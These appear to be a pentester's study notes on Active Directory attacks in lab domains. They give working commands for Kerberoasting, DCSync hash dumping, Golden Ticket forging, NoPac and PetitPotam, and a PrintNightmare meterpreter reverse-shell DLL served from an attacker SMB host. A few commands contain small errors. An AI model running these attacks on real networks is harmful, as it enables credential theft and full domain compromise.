# active directory attacks enumeration


## ACL

### Addself

    Addself abused with Add-DomainGroupMember

Shows security groups that a user can add themselves to.

### ForceChangePassword

    Abused with Set-DomainUserPassword
    https://github.com/Andre92Marcos/tools/blob/master/powersploit/PowerView.md#functions

Gives us the right to reset a user's password without first knowing their password (should be used cautiously and typically best to consult our client before resetting passwords).

### GenericWrite

    Abused with Set-DomainObject

Gives us the right to write to any non-protected attribute on an object. If we have this access over a user, we could assign them an SPN and perform a Kerberoasting attack (which relies on the target account having a weak password set). Over a group means we could add ourselves or another security principal to a given group. Finally, if we have this access over a computer object, we could perform a resource-based constrained delegation attack which is outside the scope of this module.


### GenericAll

    Abused with Set-DomainUserPassword or Add-DomainGroupMember

This grants us full control over a target object. Again, depending on if this is granted over a user or group, we could modify group membership, force change a password, or perform a targeted Kerberoasting attack. If we have this access over a computer object and the Local Administrator Password Solution (LAPS) is in use in the environment, we can read the LAPS password and gain local admin access to the machine which may aid us in lateral movement or privilege escalation in the domain if we can obtain privileged controls or gain some sort of privileged access.

### WriteOwner

    Abuse with bloodyAD

    bloodyAD --host <host_ip> -d '<domain_name>' -u '<username>' -p '<password>' set owner <group_name> <name_of_new_owner>
    dacledit.py -action 'write' -rights 'FullControl' -principal '<username_of_new_owner>' -target '<username_being_owned>' '<domain_name>'/'<username_new_owner>':'<password_new_owner>' # to give full control

https://github.com/Andre92Marcos/tools/tree/master/bloodyAD



## AS-REPRoasting

It's possible to obtain the Ticket Granting Ticket (TGT) for any account that has the Do not require Kerberos pre-authentication setting enabled. Many vendor installation guides specify that their service account be configured in this way. The authentication service reply (AS_REP) is encrypted with the account’s password, and any domain user can request it.

With pre-authentication, a user enters their password, which encrypts a time stamp. The Domain Controller will decrypt this to validate that the correct password was used. If successful, a TGT will be issued to the user for further authentication requests in the domain. If an account has pre-authentication disabled, an attacker can request authentication data for the affected account and retrieve an encrypted TGT from the Domain Controller. This can be subjected to an offline password attack using a tool such as Hashcat or John the Ripper.

AS-REPRoasting is similar to Kerberoasting, but it involves attacking the AS-REP instead of the TGS-REP. An SPN is not required. This setting can be enumerated with PowerView or built-in tools such as the PowerShell AD module.

The attack itself can be performed with the Rubeus toolkit and other tools to obtain the ticket for the target account. If an attacker has GenericWrite or GenericAll permissions over an account, they can enable this attribute and obtain the AS-REP ticket for offline cracking to recover the account's password before disabling the attribute again. Like Kerberoasting, the success of this attack depends on the account having a relatively weak password.

Check if users in the domain that have the pre authentication not required:

    Get-DomainUser -PreauthNotRequired | select samaccountname,userprincipalname,useraccountcontrol | fl

This attack does not require any domain user context and can be done by just knowing the SAM name for the user without Kerberos pre-auth.


    .\Rubeus.exe asreproast /user:<domain_username> /nowrap /format:hashcat

When performing user enumeration with Kerbrute, the tool will automatically retrieve the AS-REP for any users found that do not require Kerberos pre-authentication.

    kerbrute userenum -d <domain_name> --dc <domain_controller_ip> <domain_usernames_list>.txt
    kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt

Or use impacket Get-NPUsers.py

    GetNPUsers.py <domain_name>/ -dc-ip <domain_controller_ip> -no-pass -usersfile <domain_usernames_list>.txt

We can the crack the hash with hashcat:

    hashcat -m18200 '$krb5asrep$23$spot@offense.local:3171EA207B3A6FDAEE52BA247C20362E$56FE7DC0CABA8CB7D3A02A140C612A917DF3343C01BCDAB0B669EFA15B29B2AEBBFED2B4F3368A897B833A6B95D5C2F1C2477121C8F5E005AA2A588C5AE72AADFCBF1AEDD8B7AC2F2E94E94CB101E27A2E9906E8646919815D90B4186367B6D5072AB9EDD0D7B85519FBE33997B3D3B378340E3F64CAA92595523B0AD8DC8E0ABE69DDA178D8BA487D3632A52BE7FF4E786F4C271172797DCBBDED86020405B014278D5556D8382A655A6DB1787DBE949B412756C43841C601CE5F21A36A0536CFED53C913C3620062FDF5B18259EA35DE2B90C403FBADD185C0F54B8D0249972903CA8FF5951A866FC70379B9DA' -a 3 /usr/share/wordlists/rockyou.txt


### DS-Replication-Get-Changes-All - DCSync

Active Directory uses replication to synchronize data (e.g., user account information, password hashes) across domain controllers. DCsync leverages this replication mechanism by imitating a legitimate domain controller to request and receive data such as password hashes. The goal is to extract sensitive data like: NTLM hashes, Kerberos tickets and Passwords of high-value accounts (e.g., Domain Admins or KRBTGT account).


DCSync is a technique for stealing the Active Directory password database by using the built-in Directory Replication Service Remote Protocol, which is used by Domain Controllers to replicate domain data. This allows an attacker to mimic a Domain Controller to retrieve user NTLM password hashes. The crux of the attack is requesting a Domain Controller to replicate passwords via the DS-Replication-Get-Changes-All extended right. This is an extended access control right within AD, which allows for the replication of secret data.

To perform this attack, you must have control over an account that has the rights to perform domain replication (a user with the Replicating Directory Changes and Replicating Directory Changes All permissions set). Domain/Enterprise Admins and default domain administrators have this right by default.

If we had certain rights over the user (such as WriteDacl), we could also add this privilege to a user under our control, execute the DCSync attack, and then remove the privileges to attempt to cover our tracks.

ACL permissions required:

    DS-Replication-Get-Changes
    DS-Replication-Get-Changes-All

Check if a user has this permissions:

    first get the user sid:

    Get-DomainUser -Identity <sam_account_name> |select samaccountname,objectsid,memberof,useraccountcontrol |fl
    $sid = "<user_sid>"

    Get-ObjectAcl "DC=<domain_name>,DC=<domain_name>" -ResolveGUIDs | ? { ($_.ObjectAceType -match 'Replication-Get')} | ?{$_.SecurityIdentifier -match $sid} |select AceQualifier, ObjectDN, ActiveDirectoryRights,SecurityIdentifier,ObjectAceType | fl

Execute the attack:

    impacket-secretsdupm -outputfile <file_to_save_hashes> -just-dc <domain_name>/<username_with_permissions>:<password>@<dc_ip>
    impacket-secretsdump -outputfile inlanefreight_hashes -just-dc INLANEFREIGHT.LOCAL/tpetty:password1!@DC01.INLANEFREIGHT.LOCAL

    or with mimikatz

    lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /user:INLANEFREIGHT\administrator

We can than use the extracted hashes in: Pass-the-Hash (PtH) attacks, Golden Ticket attacks (with the krbtgt hash) and Access sensitive systems using admin accounts.

## Golden Ticket

A Golden Ticket attack is a type of attack in Microsoft Active Directory (AD) environments where an attacker forges a Kerberos ticket (TGT – Ticket Granting Ticket) to impersonate any user, typically a Domain Admin, within the Active Directory domain. This attack enables the attacker to gain unauthorized access to resources and escalate privileges, allowing them to move freely within the network.

### How Golden Ticket Attacks Work:
1. **KRBTGT Account:** The KRBTGT account is a special account used by the **Domain Controller (DC)** to encrypt and sign all Kerberos tickets. The NTLM hash of this account is a crucial part of the Golden Ticket attack.
   
2. **Attacker's Goal:** The attacker needs to gain access to the **KRBTGT NTLM hash**. This can be achieved through:
   - **Dumping Active Directory hashes** using tools like **Mimikatz** or **Kerberos Exploitation (kerb2)**.
   - **Compromising a Domain Controller** and extracting the hash directly from the DC.

3. **Forging the Golden Ticket:**
   - Once the attacker has the KRBTGT NTLM hash, they can use it to forge a **Golden Ticket**.
   - The **Golden Ticket** is created with the attacker’s desired information, such as impersonating a **Domain Admin**.
   - The ticket is forged using tools like **Mimikatz**, which takes the **KRBTGT hash**, the target user’s information, and creates a valid TGT.

4. **Accessing Resources:** The forged TGT is then used by the attacker to request service tickets (TGS) for access to various resources, such as domain controllers, file shares, etc. The ticket is accepted by the KDC because it is signed using the KRBTGT account’s NTLM hash, making it appear legitimate.

5. **Persistence:** The attacker can use the Golden Ticket for as long as they wish, provided the **KRBTGT password** is not changed. The attacker can maintain persistent access to the domain even if their original access is detected and revoked, until the KRBTGT password is reset.

### Tools Used in Golden Ticket Attacks:

- **Mimikatz:** A popular tool used for extracting the KRBTGT NTLM hash and forging Golden Tickets.
- **Impacket:** A toolkit that includes tools to interact with Kerberos and perform attacks, such as forging tickets.
- **Rubeus:** A powerful tool that can be used for Kerberos ticket extraction and manipulation, including creating Golden Tickets.

### Execution

First, dump the KRBTGT NTLM hash using Mimikatz:

    mimikatz.exe "privilege::debug" "lsadump::sam" exit

    or

    mimikatz # lsadump::lsa /inject /name:krbtgt

Use the extracted NTLM hash to create a Golden Ticket:

    mimikatz.exe "kerberos::ptt /user:Administrator /rc4:<KRBTGT NTLM HASH> /domain:example.com /sid:<DOMAIN SID> /ticket:<BASE64 ENCODED TICKET>"
    mimikatz # kerberos::golden /user:hacker /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689 /krbtgt:9d765b482771505cbe97411065964d5f /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /ptt

    or using rubeus

    .\Rubeus.exe golden /rc4:9d765b482771505cbe97411065964d5f /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689 /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /user:hacker /ptt

    or using impacket

    ticketer.py -nthash 9d765b482771505cbe97411065964d5f -domain LOGISTICS.INLANEFREIGHT.LOCAL -domain-sid S-1-5-21-2806153819-209893948-922872689 -extra-sid S-1-5-21-3842939050-3880317879-2865463114-519 hacker



## Kerberoasting

Kerberoasting is a post-exploitation attack technique used to extract service account credentials in Active Directory (AD) environments. It targets the way Kerberos, the authentication protocol used in AD, handles service tickets for accounts configured to use Service Principal Names (SPNs).

### How Kerberoasting Works

Attackers authenticate to the domain using valid credentials (e.g., from phishing or another attack). They query the domain for accounts with SPNs, which are associated with services such as web servers, databases, or file servers. Kerberos allows any authenticated user to request a service ticket (TGS) for these accounts.

The domain controller provides the requested service ticket, which is encrypted using the service account’s NTLM hash (a hash of the account's password). Attackers use tools (e.g., Rubeus, Impacket, or PowerShell scripts) to extract the encrypted service ticket from memory.

The encrypted ticket is taken offline and subjected to password-cracking tools (e.g., Hashcat or John the Ripper) to recover the service account’s password. This is feasible because service accounts often have weak or easily crackable passwords and may not be subject to frequent rotation.

### With PowerView

First search for users with SPN property

    Get-DomainUser -SPN -Properties samaccountname,ServicePrincipalName 

Then extract the hash for cracking

    Get-DomainUser -Identity sqldev | Get-DomainSPNTicket -Format Hashcat

### Other Information

    https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1208-kerberoasting

## LLMNR/NBT-NS Poisoning

https://github.com/Andre92Marcos/vulnerabilities/blob/master/ldap/llmnr_ntbt-ns_poisoning.md

From Linux

    sudo responder -I <nerwork_interface>


## NoPac - SamAccountName Spoofing

This vulnerability encompasses two CVEs 2021-42278 and 2021-42287, allowing for intra-domain privilege escalation from any standard domain user to Domain Admin level access in one single command.

This exploit path takes advantage of being able to change the SamAccountName of a computer account to that of a Domain Controller. By default, authenticated users can add up to ten computers to a domain. When doing so, we change the name of the new host to match a Domain Controller's SamAccountName. Once done, we must request Kerberos tickets causing the service to issue us tickets under the DC's name instead of the new name. When a TGS is requested, it will issue the ticket with the closest matching name. Once done, we will have access as that service and can even be provided with a SYSTEM shell on a Domain Controller.

We can use this tool to perform this attack. NoPac uses many tools in Impacket to communicate with, upload a payload, and issue commands from the attack host to the target DC.

    https://github.com/Ridter/noPac

We can use the scripts in the NoPac directory to check if the system is vulnerable using a scanner (scanner.py) then use the exploit (noPac.py) to gain a shell as NT AUTHORITY/SYSTEM. We can use the scanner with a standard domain user account to attempt to obtain a TGT from the target Domain Controller. If successful, this indicates the system is, in fact, vulnerable.

    sudo python3 scanner.py <domain_name>/<domain_username>:<domain_user_password> -dc-ip <domain_controller_ip> -use-ldap

There are many different ways to use NoPac to further our access. One way is to obtain a shell with SYSTEM level privileges. We can do this by running noPac.py with the syntax below to impersonate the built-in administrator account and drop into a semi-interactive shell session on the target Domain Controller. This could be "noisy" or may be blocked by AV or EDR.

    sudo python3 noPac.py <domain_name>/<domain_username>:<domain_user_password> -dc-ip <domain_controller_ip>  -dc-host <domain_controller_host_name> -shell --impersonate administrator -use-ldap

Using noPac to DCSync the Built-in Administrator Account

    sudo python3 noPac.py <domain_name>/<domain_username>:<domain_user_password> -dc-ip <domain_controller_ip>  -dc-host <domain_controller_host_name> --impersonate administrator -use-ldap -dump -just-dc-user <domain_name>/administrator


## pass-the-ticket


## Pass The Hash Attacks

A Pass-the-Hash (PtH) attack is a type of cyberattack that allows an attacker to authenticate to a system using a hashed version of a password, rather than requiring the plaintext password itself. This type of attack exploits the way authentication protocols work in environments like Windows that use NTLM (NT LAN Manager) or Kerberos authentication.

Attackers gain access to a system and extract password hashes stored in memory, registry, or files. This is often achieved by exploiting vulnerabilities or misconfigurations, or through the use of malware or social engineering.

Instead of attempting to crack or decrypt the hash, attackers directly inject or replay the hash to authenticate to other systems or services. Authentication protocols like NTLM accept the hash as proof of identity if it matches the expected value on the target system.

Once authenticated, attackers can move laterally across the network, impersonating users whose hashes they have stolen. If an attacker captures the hash of a privileged user (e.g., a domain administrator), they can gain access to highly sensitive systems and data.

### Why PtH Attacks Are Effective

Reuse of Hashes: Many organizations do not regularly refresh or secure hashed credentials, allowing attackers to use stolen hashes over extended periods.

Default Behaviors: Windows systems often store hashed passwords in memory for authentication purposes, creating opportunities for attackers to extract them.

Trust in Authentication Protocols: NTLM and other protocols assume that possession of the hash equates to proof of identity.


### Why is Kerberos less vulnerable to Pass the Hash Attacks

Kerberos uses tickets (e.g., Ticket-Granting Ticket, or TGT) for authentication. These tickets are time-limited and are issued by a trusted third-party, the Key Distribution Center (KDC).

A user's password hash is only used once during the initial authentication with the KDC to obtain the TGT, and it is not transmitted or reused during subsequent sessions.

In PtH attacks, an attacker exploits systems that reuse static password hashes (like in NTLM). Since Kerberos does not reuse password hashes but instead uses temporary tickets, stealing a hash does not provide reusable credentials.

Kerberos tickets are encrypted with keys derived from the user’s password hash and the KDC’s secret key. Communications between clients and servers in Kerberos are also encrypted, protecting the credentials and tickets from interception.

Even if attackers intercept a Kerberos ticket or its encrypted form, they would need the secret keys to decrypt or reuse it, making it far harder to exploit than plaintext or reusable hashes.

Kerberos provides mutual authentication, where both the client and server prove their identities to each other. This prevents attackers from using stolen credentials to impersonate legitimate services or users without being detected. NTLM lacks mutual authentication, making it easier for attackers to perform PtH attacks or other replay attacks by impersonating legitimate users or systems.

Kerberos tickets are valid only for a limited time (e.g., 10 hours by default), after which they expire. Even if an attacker steals a Kerberos ticket, its usefulness is time-bound. In contrast, NTLM hashes do not have an expiration period, allowing attackers to reuse them indefinitely until passwords are changed.

Kerberos does not require the user’s password hash to be stored or transmitted across the network during normal operation. After the initial authentication, the TGT is used instead. NTLM often stores hashed credentials in memory or on disk (e.g., in the Security Account Manager or LSASS memory), creating opportunities for PtH attacks.

| **Feature**                     | **Kerberos**                        | **NTLM**                               |
|----------------------------------|--------------------------------------|----------------------------------------|
| **Reusability of Credentials**   | Temporary tickets                   | Static password hashes                 |
| **Encryption**                   | Encrypted tickets                   | Weak/no encryption for hashes          |
| **Mutual Authentication**        | Yes                                 | No                                     |
| **Time-Bound Authentication**    | Tickets expire                      | Hashes do not expire                   |
| **Credential Storage**           | Minimal local storage               | Often stored locally and in memory     |



## PetitPotam (MS-EFSRPC)

PetitPotam is a critical vulnerability (CVE-2021-36942) that was discovered in Microsoft Windows' MS-EFSRPC (Microsoft Encrypting File System Remote Protocol), which is used for communication between Windows machines in an Active Directory environment. This vulnerability allows an attacker to escalate privileges or perform NTLM relay attacks by forcing a vulnerable Windows machine to authenticate to an attacker-controlled server, potentially allowing the attacker to gain administrative privileges.If MS-EFSRPC is exposed to the network and is vulnerable, it may be a vector for the attack.

### Overview of PetitPotam (CVE-2021-36942)
- **Vulnerability Type:** NTLM Relay / Authentication Bypass.
- **Impact:** The vulnerability allows attackers to escalate privileges and potentially take over a Windows domain controller, leading to full domain compromise.
- **Discovery Date:** July 2021.
- **Affected Components:**
  - MS-EFSRPC (Microsoft Encrypting File System Remote Protocol)
  - Active Directory Domain Services (AD DS)
  - Other services relying on NTLM authentication.

### How PetitPotam Works:
The vulnerability exists in the way Windows handles NTLM authentication during communication between systems in an Active Directory domain. Specifically, an attacker can use **MS-EFSRPC** to force a machine to authenticate with an attacker-controlled server. By leveraging the NTLM relay attack, an attacker can capture the authentication request and relay it to other machines or services, such as a **domain controller**.

Here's a general breakdown of the attack flow:
1. **MS-EFSRPC Vulnerability:** The attacker sends a specially crafted request to a vulnerable Windows system, triggering the system to use NTLM authentication for communication.
2. **NTLM Relay Attack:** The attacker intercepts the NTLM authentication request and relays it to a target machine (e.g., a domain controller or another Windows machine) that will accept the authentication.
3. **Privilege Escalation:** If successful, the attacker can gain administrative privileges on the target machine, which may include full control of the domain or other services.

### Affected Versions:
PetitPotam affects the following Windows versions and configurations:
- **Windows Server** (including versions used in Active Directory environments).
- **Windows 10** and other systems that may communicate with Windows Server.
- Specifically, any system where MS-EFSRPC is exposed and NTLM authentication is used.

### Attack Scenarios:
1. **Domain Controller Compromise:**
   - An attacker can relay authentication requests to a domain controller and potentially compromise the entire domain.
2. **Privilege Escalation in AD Environments:**
   - By targeting machines that are part of an Active Directory domain, attackers could escalate their privileges from a low-privileged user to an administrator or domain admin.

### Execution

Get the petitpotam git repo:

    git clone https://github.com/topotam/PetitPotam.git

Check for the vulnerability, by testing if MS-EFSRPC is accessible:

    rpcclient -U "" -N <domain_controller_ip> -c "srvinfo"

    or impacket's

    rpcdump <domain_controller_ip>

    or just run the petitpotam python script bellow


Execute the PetitPotam exploit by specifying the IP address of the attack host (172.16.5.255) and the target Domain Controller (172.16.5.5). 

    python3 PetitPotam.py 172.16.5.225 172.16.5.5

## PrintNightmare

PrintNightmare is a critical security vulnerability (CVE-2021-34527) discovered in the Windows Print Spooler service, which is responsible for managing print jobs on a Windows system. The vulnerability allows attackers to remotely execute code with system-level privileges, potentially leading to full system compromise.

### Overview of PrintNightmare (CVE-2021-34527)
- **Affected Component:** Windows Print Spooler service.
- **Vulnerability Type:** Remote Code Execution (RCE).
- **Impact:** Allows remote attackers to execute arbitrary code on affected systems with SYSTEM privileges, potentially taking full control of the system.
- **Discovery Date:** June 2021.
- **Affected Versions:** Various versions of Windows, including Windows 7, 8, 10, and Windows Server editions.

### How PrintNightmare Works
The vulnerability stems from improper handling of print spooler requests, allowing an attacker to inject malicious code into the spooler service. An attacker could exploit this vulnerability to gain elevated privileges and execute arbitrary code on the affected system.

1. **Remote Code Execution:** An attacker can remotely trigger the vulnerability by sending a specially crafted print job or by remotely interacting with the vulnerable Print Spooler service, typically through SMB (Server Message Block) or RPC (Remote Procedure Call).
  
2. **Privilege Escalation:** Once an attacker can execute code in the context of the Print Spooler service, they can achieve SYSTEM-level privileges, allowing them to perform actions such as installing malware, altering system configurations, and compromising sensitive data.

3. **Exploitation Vector:** Since the vulnerability is present in the Print Spooler service, an attacker doesn't need physical access to a system to exploit it, making it a high-risk vulnerability for remote exploitation.


### Exploitation Scenarios
- **Remote Attacks:** Attackers can exploit the vulnerability remotely via network protocols like SMB or RPC to compromise machines that have the Print Spooler service running.
- **Local Attacks:** If an attacker has local access to a machine, they could leverage this vulnerability to escalate privileges to SYSTEM and take control of the system.

### Execution
Install PrintNightmare from cube0x0 exploit using git from a Linux-based host

    git clone https://github.com/cube0x0/CVE-2021-1675.git

    also try

    https://github.com/dievus/printspoofer

Check if a Windows target has MS-PAR & MSRPRN exposed

    rpcdump.py @172.16.5.5 | egrep 'MS-RPRN|MS-PAR'

Generate a DLL payload to be used by the exploit to gain a shell session.

    msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.129.202.111 LPORT=8080 -f dll > backupscript.dll

Create an SMB server and host a shared folder (CompData) at the specified location on the local linux host. This can be used to host the DLL payload that the exploit will attempt to download to the host.


    sudo smbserver.py -smb2support CompData /path/to/backupscript.dll

Executes the exploit and specifies the location of the DLL payload

    sudo python3 CVE-2021-1675.py inlanefreight.local/<username>:<password>@172.16.5.5 '\\10.129.202.111\CompData\backupscript.dll'


Shadow Credentials
Pass the hash attacks
Active Directory Certificate Services (AD CS) attacks
Kerberos Constrained Delegation
Kerberos Unconstrained Delegation
Kerberos Resource-Based Constrained Delegation (RBCD)
Kerberos: Silver Tickets


WriteOwner abused with Set-DomainObjectOwner
WriteDACL abused with Add-DomainObjectACL
AllExtendedRights abused with Set-DomainUserPassword or Add-DomainGroupMember
Add Members abused with Add-DomainGroupMember